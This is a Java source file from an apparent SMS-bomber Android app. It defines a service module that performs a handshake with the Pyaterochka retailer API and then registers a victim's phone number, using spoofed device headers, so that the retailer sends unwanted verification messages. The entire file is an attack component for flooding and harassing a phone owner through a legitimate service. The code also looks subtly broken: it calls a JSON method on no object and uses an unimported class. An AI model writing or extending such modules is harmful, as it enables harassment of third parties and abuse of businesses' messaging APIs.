package com.dm.bomber.services;

import androidx.annotation.NonNull;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.MediaType;
import okhttp3.FormBody;
import okhttp3.Request;
import okhttp3.Response;

public class Pyaterochka extends Service {

    @Override
    public void run(Callback callback) {
        JSONObject json = new JSONObject();
        JSONObject app = new JSONObject();

        try {
            app.put("platform", "android");
            app.put("push_token", "bruh");
            app.put("user_agent", "pyaterochka.app / Android (3.15.2)");
            app.put("version", "3.15.2");
            json.put("app", app);
            json.put("version", "1");
        } catch (JSONException e) {
            e.printStackTrace();
        }

        client.newCall(new Request.Builder()
                .url("https://my.5ka.ru/api/v1/startup/handshake")
                .post(RequestBody.create(json.toString(), MediaType.parse("application/json")))
                .build()).enqueue(new Callback() {
            @Override
            public void onFailure(@NonNull Call call, @NonNull IOException e) {
                callback.onFailure(call, e);
            }

            @Override
            public void onResponse(@NonNull Call call, @NonNull Response response) throws IOException {
                try {
                    JSONObject json = new JSONObject(response.body().string());
                    JSONObject req = new JSONObject();
                    
                    req.put("number", "+" + getFormattedPhone());

                    client.newCall(new Request.Builder()
                            .url("https://my.5ka.ru/api/v1/services/phones/add")
                            .header("X-Authorization", "Token" + getJSONObject("server").getJSONObject("features").getJSONObject("security/session").getJSONObject("token").getString("value"))
                            .header("X-CAN-RECEIVE-PUSH", "true")
                            .header("X-PUSH-TOKEN", "aboba")
                            .header("X-DEVICE-ID", "aboba")
                            .header("X-PLATFORM", "android")
                            .header("X-APP-VERSION", "3.15.2")
                            .header("format", "json")
                            .header("X-MANUFACTURER", "Xiaomi")
                            .header("X-PUSH-SERVICE", "GMS")
                            .post(RequestBody.create(req.toString(), MediaType.parse("application/json")))
                            .build()).enqueue(callback);
                } catch (JSONException e) {
                    e.printStackTrace();
                }
            }
        });
    }
}